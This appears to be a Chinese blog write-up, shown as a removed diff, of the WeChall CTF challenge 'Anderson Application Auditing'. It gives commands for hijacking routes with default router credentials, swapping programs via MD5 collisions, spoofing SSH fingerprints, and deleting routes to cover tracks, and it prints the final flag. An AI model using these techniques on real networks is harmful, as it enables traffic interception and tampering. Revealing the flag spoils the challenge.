-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-anderson-application-auditing/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-anderson-application-auditing/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>Anderson Application Auditing 是 storyline/realistic
-多阶段挑战。背景：VSA 委托 SoftMicro 开发程序、Anderson 负责审计，你作为
-hacker 需要劫持 Anderson 与 SoftMicro/VSA
-之间的通信，替换被审计程序为恶意版本。过程中收集六段 secret
-code，拼接后提交。</p>
-<p>已知信息：</p>
-<ul>
-<li>SoftMicro 网段：<code>207.46.197.0</code></li>
-<li>你的 public IP：<code>17.149.160.49</code></li>
-<li>Anderson 主页：<code>index2.html</code></li>
-</ul>
-<h3 id="solution">Solution</h3>
-<h4 id="第一阶段路由劫持">第一阶段：路由劫持</h4>
-<p>阅读 <code>tech_spec.txt</code>
-获取网络文档，其中泄露了路由器管理凭据 <code>admin/admin</code>。</p>
-<p>访问
-<code>router_config.html</code>，用默认凭据登录。添加两条路由，将
-SoftMicro 和 Anderson 相关网段的流量劫持到你的 public IP：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add -net 207.46.197.0 netmask 255.255.255.0 gw 17.149.160.49</span><br><span class="line">route add -net 12.110.110.0 netmask 255.255.255.0 gw 17.149.160.49</span><br></pre></td></tr></table></figure>
-<p>成功添加后获得第一段 secret code。</p>
-<h4 id="第二阶段md5-碰撞">第二阶段：MD5 碰撞</h4>
-<p>题目模拟 Anderson 通过 PKI/MD5 验证程序完整性。需要上传两个内容不同但
-MD5 相同的文件来替换合法程序。</p>
-<p>页面提示使用 MD5 碰撞工具。用 fastcoll（Linux）生成碰撞文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;prefix&quot;</span> &gt; good.txt</span><br><span class="line">fastcoll -p good.txt -o evil1.txt evil2.txt</span><br></pre></td></tr></table></figure>
-<p>上传两个碰撞文件后获得第二段 secret code。</p>
-<h4 id="第三阶段ssh-fingerprint">第三阶段：SSH Fingerprint</h4>
-<p>服务只检查 SSH fingerprint 的前 2 字节和最后 1 字节。需要用 fuzzy
-fingerprint 工具生成满足部分匹配的密钥对。</p>
-<p>使用 THC-FuzzyFingerprint（<code>ffp</code>）工具：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标 fingerprint（16 进制，只关心前 2 和后 1 nibble）</span></span><br><span class="line">ffp -f md5 -k 4 -l 1000 -t 03:88:9c:36:41:50:39:15:04:95:89:a4:15:84:fb:b3 -e -d /tmp</span><br></pre></td></tr></table></figure>
-<p>生成后上传 <code>ssh-rsa00.pub</code>（公钥）和
-<code>ssh-rsa00</code>（私钥），通过验证后获得第三、四段 secret
-code。</p>
-<h4 id="第四阶段清理痕迹">第四阶段：清理痕迹</h4>
-<p>回到 <code>router_config.html</code>，删除之前添加的路由：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route del -net 207.46.197.0 netmask 255.255.255.0 gw 17.149.160.49</span><br><span class="line">route del -net 12.110.110.0 netmask 255.255.255.0 gw 17.149.160.49</span><br></pre></td></tr></table></figure>
-<p>完成后获得第五、六段 secret code。</p>
-<h4 id="最终提交">最终提交</h4>
-<p>六段 secret code 按顺序拼接：</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">routeevilmd5mitmfingerprintgameover</span></span>
 
       
     </div>
